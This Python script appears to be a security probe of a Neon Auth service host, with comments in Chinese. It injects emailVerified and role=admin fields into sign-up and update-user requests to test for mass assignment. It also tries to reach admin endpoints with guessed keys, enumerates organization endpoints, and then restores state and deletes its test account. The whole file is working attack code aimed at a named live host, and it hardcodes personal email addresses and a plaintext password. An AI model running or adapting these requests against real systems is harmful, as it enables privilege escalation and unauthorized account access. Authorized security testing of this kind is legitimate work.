# -*- coding: utf-8 -*-
"""mass assignment 面: sign-up/update-user 字段注入(emailVerified/role/email)
+ admin/api-key 端点探测 + organization 面存在性"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
EMAIL = 'libobo1229+na2@gmail.com'
PWD = 'SecTest!2026pass2'
NA4 = 'libobo1229+na4@gmail.com'  # 测试注册账户(测后删除)

def req(host, method, path, body=None, headers=None, origin=None, raw_headers=False):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if origin is not None:
        h['Origin'] = origin
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    data = r.read()
    st = r.status
    hdrs = r.headers
    conn.close()
    if raw_headers:
        return st, data, hdrs
    return st, data

def user_from(resp):
    try:
        j = json.loads(resp)
        u = j.get('user') or j.get('users') or {}
        return {k: u.get(k) for k in ('id', 'email', 'emailVerified', 'role', 'name')}
    except Exception:
        return resp[:120]

print('=== [1] sign-up 字段注入(emailVerified/role) ===')
st, raw, hdrs = req(NA, 'POST', '/neondb/auth/sign-up/email',
                    {'email': NA4, 'password': PWD, 'name': 'k-ma-test',
                     'emailVerified': True, 'role': 'admin'},
                    origin='http://localhost:3000', raw_headers=True)
print('sign-up -> %d' % st)
print('  user=%s' % user_from(raw.decode(errors='replace')))
print('  body=%s' % raw.decode(errors='replace')[:200])
cook4 = '; '.join(c.split(';')[0] for c in (hdrs.get_all('Set-Cookie') or [])) if st == 200 else ''

if cook4:
    print('\n=== [2] 读回 na4 账户状态(字段是否持久化) ===')
    st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Cookie': cook4})
    print('get-session -> %d  user=%s' % (st, user_from(raw.decode(errors='replace'))))
    # update-user 再试 emailVerified=false + role
    st, raw = req(NA, 'POST', '/neondb/auth/update-user', {'emailVerified': False, 'role': 'user'},
                  headers={'Cookie': cook4}, origin='http://localhost:3000')
    print('update-user(emailVerified=false,role=user) -> %d  user=%s' % (st, user_from(raw.decode(errors='replace'))))
    st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Cookie': cook4})
    print('readback -> %d  user=%s' % (st, user_from(raw.decode(errors='replace'))))

print('\n=== [3] na2 主账户 update-user 字段矩阵 ===')
st, raw, hdrs = req(NA, 'POST', '/neondb/auth/sign-in/email', {'email': EMAIL, 'password': PWD},
                    origin='http://localhost:3000', raw_headers=True)
cook2 = '; '.join(c.split(';')[0] for c in hdrs.get_all('set-cookie'))
print('login=%d' % st)
for field, val in [('emailVerified', True), ('email', 'libobo1229+na3@gmail.com'),
                   ('role', 'admin'), ('phoneNumber', '12345678901')]:
    st, raw = req(NA, 'POST', '/neondb/auth/update-user', {field: val},
                  headers={'Cookie': cook2}, origin='http://localhost:3000')
    print('  update-user {%s} -> %d  user=%s' % (field, st, user_from(raw.decode(errors='replace'))))
    time.sleep(0.3)
# 读回确认是否真变
st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Cookie': cook2})
print('readback na2 -> %s' % user_from(raw.decode(errors='replace')))
# 恢复原状(emailVerified 恢复 false, 邮箱若不是原值则改回)
st, raw = req(NA, 'POST', '/neondb/auth/update-user', {'email': EMAIL, 'emailVerified': False},
              headers={'Cookie': cook2}, origin='http://localhost:3000')
print('restore na2 -> %d  user=%s' % (st, user_from(raw.decode(errors='replace'))))

print('\n=== [4] admin / api-key 端点探测 ===')
for p, hdrs_extra in [
    ('/neondb/auth/admin/list-users', {}),
    ('/neondb/auth/admin/list-users', {'x-admin-key': 'admin'}),
    ('/neondb/auth/admin/list-users', {'x-admin-key': 'neon-admin-key'}),
    ('/neondb/auth/admin/list-users', {'Authorization': 'Bearer admin'}),
    ('/neondb/auth/api-key', {}),
    ('/neondb/auth/api-keys', {}),
    ('/neondb/auth/admin', {}),
]:
    st, raw = req(NA, 'GET', p, headers=hdrs_extra)
    print('  GET %s %s -> %d %s' % (p, list(hdrs_extra.keys()), st, raw.decode(errors='replace')[:80]))
    time.sleep(0.2)

print('\n=== [5] organization 面存在性 ===')
for p, b in [('/neondb/auth/organization/create', {}),
             ('/neondb/auth/organization', {}),
             ('/neondb/auth/organizations', {}),
             ('/neondb/auth/organization/list', {})]:
    st, raw = req(NA, 'POST', p, b, headers={'Cookie': cook2}, origin='http://localhost:3000')
    print('  POST %s -> %d %s' % (p.split('/auth/')[1], st, raw.decode(errors='replace')[:100]))
    time.sleep(0.2)

print('\n=== [6] 清理 na4 ===')
if cook4:
    st, raw = req(NA, 'POST', '/neondb/auth/delete-user', {'password': PWD},
                  headers={'Cookie': cook4}, origin='http://localhost:3000')
    print('delete na4 -> %d %s' % (st, raw.decode(errors='replace')[:100]))
else:
    print('na4 未注册成功, 无需清理')
